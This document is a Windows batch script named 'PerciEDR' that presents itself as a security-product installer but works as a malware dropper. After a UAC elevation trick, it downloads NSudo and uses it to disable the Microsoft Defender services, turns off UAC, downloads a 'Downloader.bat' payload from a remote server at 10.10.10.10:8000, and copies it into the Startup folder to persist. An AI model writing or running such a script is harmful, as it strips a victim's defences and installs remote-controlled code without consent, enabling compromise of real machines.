@echo off

title PerciEDR

set downloaderserver="10.10.10.10:8000"
set downloadername="Downloader.bat"
set directory="C:\Supertools"

net session >nul 2>&1
if %errorLevel% == 0 (
     echo Success! The installation is started, waiting....
     goto gotAdmin
) else (
 echo Failure! You need to be admin to install this program.
 goto UACPrompt
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

echo  ...Installation... The system will rebooted

color E

cd C:\

if not exist %directory% mkdir %directory%

bitsadmin /transfer Download /download /priority FOREGROUND  https://github.com/M2Team/NSudo/releases/download/9.0-Preview1/NSudo_9.0_Preview1_9.0.2676.0.zip  C:\Supertools\Nsudo.zip 
powershell.exe -command "Expand-Archive -Force 'C:\Supertools\Nsudo.zip' 'C:\Supertools\Nsudo'"

if exist "%ProgramFiles(x86)%" (
cd %directory%\Nsudo\x64\
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc"  /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdnisDrv" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdfilter" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdboot" /v "Start" /t REG_DWORD /d "4" /f
) else (
cd %directory%\Nsudo\Win32\
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc"  /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdnisDrv" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdfilter" /v "Start" /t REG_DWORD /d "4" /f
NSudoLC.exe -U:T -ShowWindowMode:Hide reg add "HKLM\SYSTEM\CurrentControlSet\Services\wdboot" /v "Start" /t REG_DWORD /d "4" /f
)

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

bitsadmin /transfer Installation  /download /priority foreground %downloaderserver%/%downloadername% C:\Supertools\%downloadername%
copy %directory%\%downloadername% "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%downloadername%"


rem shutdown -r
